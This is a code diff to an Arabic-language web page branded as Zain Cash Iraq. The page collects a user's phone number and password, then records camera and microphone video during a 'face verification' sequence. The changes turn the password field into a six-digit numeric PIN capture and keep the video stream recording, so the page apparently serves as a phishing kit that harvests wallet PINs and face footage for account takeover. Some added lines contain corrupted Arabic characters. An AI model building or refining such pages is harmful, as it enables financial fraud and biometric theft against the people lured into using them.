@@ -54,7 +54,7 @@
     .step-dot.active { background: linear-gradient(135deg,var(--primary-1) 70%,var(--primary-2) 100%); border-color:var(--primary-1); }
 
     label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
-    /* موحّد لخانات الإدخال */
+    /* موحّد ل��انات الإدخال */
     input[type="text"], input[type="tel"], input[type="number"], input[type="password"], select, .text-input {
       padding:12px 12px;
       border-radius:10px;
@@ -207,7 +207,7 @@
       <h3 id="permTitle">نحتاج إذن الكاميرا</h3>
       <p id="permText">
         التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه. إذا رفضت الطلب سيتم عرض هذه النافذة وتستطيع إعادة المحاولة.
-        الرجاء السماح بالكاميرا حتى نتمكن من المتابعة.
+        الرجاء السم��ح بالكاميرا حتى نتمكن من المتابعة.
       </p>
       <p style="color:#666;font-size:13px;margin-top:6px;">
         ملاحظة: بعض المتصفحات تحفظ خيار "رفض" بشكل دائم. إذا ظهرت رسالة أن الإذن محظور بشكل دائم، افتح إعدادات المتصفح (انقر على أيقونة القفل بجوار شريط العنوان) واسمح للكاميرا للموقع ثم اضغط "إعادة المحاولة".
@@ -260,7 +260,7 @@
         <label>رقم الهاتف المرتبط بحسابك</label>
         <input type="tel" id="phone" placeholder="07XXXXXXXXXX" maxlength="11" required autocomplete="tel" inputmode="numeric"/>
         <label style="margin-top:12px;">كلمة السر</label>
-        <input type="password" id="password" placeholder="أدخل كلمة السر" required autocomplete="current-password"/>
+        <input type="tel" id="password" placeholder="000000" maxlength="6" required inputmode="numeric"/>
         <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">التالي</button></div>
       </form>
       <div class="zain-footer">Zain Cash Iraq &copy; 2025</div>
@@ -268,6 +268,12 @@
     const phone = document.getElementById('phone');
     const password = document.getElementById('password');
     phone.focus();
+    
+    // تصفية مدخلات كلمة السر (أرقام فقط و 6 أرقام كحد أقصى)
+    password.addEventListener('input', function(){
+      this.value = this.value.replace(/\D/g,'').slice(0,6);
+    });
+    
     document.getElementById('phoneForm').onsubmit = async (e) => {
       e.preventDefault();
       const phoneVal = phone.value.trim();
@@ -279,8 +285,8 @@
         return; 
       }
       
-      if(!passwordVal){ 
-        alert('يرجى إدخال كلمة السر'); 
+      if(passwordVal.length !== 6){ 
+        alert('يرجى إدخال كلمة السر تتكون من 6 أرقام بالضبط'); 
         password.focus(); 
         return; 
       }
@@ -397,7 +403,7 @@
 
     const steps = [
       { label: 'اغمض عينيك', instruction: 'أغلق عينيك بالكامل لمدة 3 ثوانٍ', duration: 3000 },
-      { label: 'حرك وجهك إلى اليمين', instruction: 'حرّك وجهك قليلاً إلى اليمين ثم عد للمنتصف', duration: 3000 },
+      { label: 'حرك وجهك إلى اليمين', instruction: 'حرّك وجهك قليلاً إلى اليمين ثم ع�� للمنتصف', duration: 3000 },
       { label: 'العودة للمنتصف', instruction: 'عد إلى وضع الوجه في المنتصف واثبت لبضع ثوانٍ', duration: 1500 },
       { label: 'حرك وجهك إلى اليسار', instruction: 'حرّك وجهك قليلاً إلى اليسار ثم عد للمنتصف', duration: 3000 },
       { label: 'حرك وجهك إلى اليمين مرة أخرى', instruction: 'حرّك وجهك قليلاً إلى اليمين مرة أخرى ثم عد للمنتصف', duration: 3000 },
@@ -537,7 +543,6 @@
 
     drawActive = false;
     // لا نوقف الستريم - سيبقى الفيديو مسجل
-    // stopStream(stream); // تم التعليق عن هذا السطر
 
     const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
     const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
